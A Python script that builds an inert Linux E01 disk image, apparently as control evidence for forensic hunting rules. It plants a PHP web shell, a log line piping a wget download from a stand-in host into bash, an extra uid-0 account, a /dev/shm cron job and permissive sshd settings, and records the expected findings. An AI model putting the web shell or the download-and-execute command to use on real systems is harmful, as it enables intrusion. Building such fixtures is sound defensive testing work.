"""Build inert Linux E01 controls, including evidence beyond the legacy 512 MiB cache.

Run in a disposable worker container. Fixture content is never executed.
"""
import gzip
import json
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

out=Path(sys.argv[1]);out.mkdir(parents=True,exist_ok=True)
with tempfile.TemporaryDirectory() as temp:
    root=Path(temp)/'root';root.mkdir()
    files={
      'etc/passwd':b'root:x:0:0:root:/root:/bin/bash\nservice:x:0:0:service:/root:/bin/sh\n',
      'etc/hostname':b'blind-control\n','etc/os-release':b'NAME=Forensic fixture\n',
      'etc/cron.d/update':b'13 * * * * root /dev/shm/update.sh\n',
      'etc/ssh/sshd_config':b'PermitRootLogin yes\nPasswordAuthentication yes\n',
      'opt/maintenance/check.sh':b'#!/bin/sh\ngrep -R "/dev/tcp/" /opt\nprintf "%s" "LD_PRELOAD=/opt/example.so"\n',
      'opt/app/public/index.php':b'<?php system($_REQUEST["exec"]);\n',
      'var/log/zz-messages':b'2026-09-01T02:03:00+09:00 host CMD: host root 02:03 555 /tmp C= 1 wget -qO- https://example.invalid/update | /bin/bash\n',
      'var/log/zz-secure.1.gz':gzip.compress(b'2026-09-01T01:00:00+09:00 host sshd[500]: Accepted password for service from 192.0.2.80 port 5678 ssh2\n'),
      'usr/bin/fixture-tool':Path('/usr/bin/true').read_bytes()+b'\0socket\0setsockopt\0prctl\0/bin/sh\0',
    }
    for name,data in files.items():
        p=root/name;p.parent.mkdir(parents=True,exist_ok=True);p.write_bytes(data)
    # Separate binary records consume the former prefix cache before later log/code paths.
    # Zero-filled content compresses well; no executable is run.
    for index in range(36):
        with (root/f'var/log/secure-padding-{index:02d}').open('wb') as f:f.write(b'\0'*(16*1024*1024))
    zone=root/'usr/share/zoneinfo/Asia';zone.mkdir(parents=True)
    shutil.copyfile('/usr/share/zoneinfo/Asia/Seoul',zone/'Seoul')
    (root/'etc/localtime').symlink_to('../usr/share/zoneinfo/Asia/Seoul')
    partition=Path(temp)/'partition.raw'
    with partition.open('wb') as f:f.truncate(768*1024*1024)
    subprocess.run(['mkfs.ext4','-q','-F','-d',str(root),str(partition)],check=True)
    disk=Path(temp)/'fixture.raw';mbr=bytearray(1024*1024)
    mbr[446:462]=struct.pack('<B3sB3sII',0,b'\0'*3,0x83,b'\0'*3,2048,partition.stat().st_size//512);mbr[510:512]=b'\x55\xaa'
    with disk.open('wb') as f,partition.open('rb') as source:f.write(mbr);shutil.copyfileobj(source,f)
    subprocess.run(['ewfacquire','-u','-q','-c','fast','-t',str(out/'hunt-controls'),str(disk)],check=True,capture_output=True)
    (out/'hunt-truth.json').write_text(json.dumps({'expected_rules':['extra_uid_zero','writable_persistence','download_execute','webshell_code','ELF_socket_filter_and_process_disguise'],
        'normal_path':'/opt/maintenance/check.sh','late_log':'/var/log/zz-messages','compressed_auth':'/var/log/zz-secure.1.gz',
        'meaning':'inert content facts; no claimed execution or actual intrusion'},indent=2))
print('Created hunt-controls.E01')
